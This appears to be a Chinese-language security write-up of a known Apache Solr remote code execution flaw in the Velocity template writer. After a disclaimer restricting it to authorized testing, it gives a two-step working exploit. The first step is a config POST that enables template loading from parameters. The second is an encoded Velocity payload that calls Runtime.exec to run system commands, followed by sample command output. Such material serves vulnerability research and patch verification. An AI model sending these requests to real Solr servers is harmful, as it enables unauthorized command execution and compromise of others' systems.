### 声明

此处提供的漏洞检测方法、文件等内容，均仅限于安全从业者在获得法律授权的情况下使用，目的是检测已授权的服务器的安全性。安全从业者务必遵守法律规定，禁止在没有得到授权的情况下做任何漏洞检测。

### 漏洞检测

2019.10.30 国外@_S00pY发布RCE via Velocity template PoC

内容如下
```
Apache Solr RCE via Velocity template

Set "params.resource.loader.enabled" as true.

Request:
========================================================================
POST /solr/test/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
========================================================================


RCE via velocity template
Request:
========================================================================
GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: localhost:8983
========================================================================


Response:
========================================================================
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 56

     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
========================================================================
```


#### 第1步

设置VelocityResponseWriter插件的params.resource.loader.enabled选项设置为true

Apache Solr默认带有VelocityResponseWriter插件，该插件的params.resource.loader.enabled选项(默认为false)，用来控制是否允许resource.loader在Solr请求参数中指定模版。

以下HTTP请求会设置VelocityResponseWriter插件的params.resource.loader.enabled选项设置为true，即允许用户通过HTTP请求指定资源的加载。

```
POST /solr/core_name/config HTTP/1.1
Host: solr.com:8983
Content-Type: application/json
Content-Length: 293

{
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
}
```

测试发现

`HTTP/1.1 200 OK`表示修改成功；
否则失败（可能因为这个core对应的solrconfig.xml没配置VelocityResponseWriter插件）

#### 第2步

构造一个自定义的Velocity模版，可实现执行任意系统命令

这里执行命令`ls -al`

```
GET /solr/core_name/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ls%20-al%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: solr.com:8983
Connection: close
```

命令执行结果 见HTTP response Body.

**例1** 执行`pwd`

得到Response
```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 27

 0 /root/solr-7.7.2/server
```

**例2** 执行`ls -al`

得到Response
```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 676

 0 total 208
drwxr-xr-x 11 root root   4096 Oct 31  2019 .
drwxr-xr-x  9 root root   4096 May 28  2019 ..
drwxr-xr-x  2 root root   4096 May 28  2019 contexts
drwxr-xr-x  2 root root   4096 May 28  2019 etc
drwxr-xr-x  3 root root   4096 May 28  2019 lib
drwxr-xr-x  2 root root   4096 Oct 31  2019 logs
drwxr-xr-x  2 root root   4096 May 28  2019 modules
-rw-r--r--  1 root root   4068 May 28  2019 README.txt
drwxr-xr-x  2 root root   4096 May 28  2019 resources
drwxr-xr-x  3 root root   4096 May 28  2019 scripts
drwxr-xr-x  6 root root   4096 Oct 31  2019 solr
drwxr-xr-x  3 root root   4096 May 28  2019 solr-webapp
-rw-r--r--  1 root root 160625 Nov 14  2018 start.jar
```
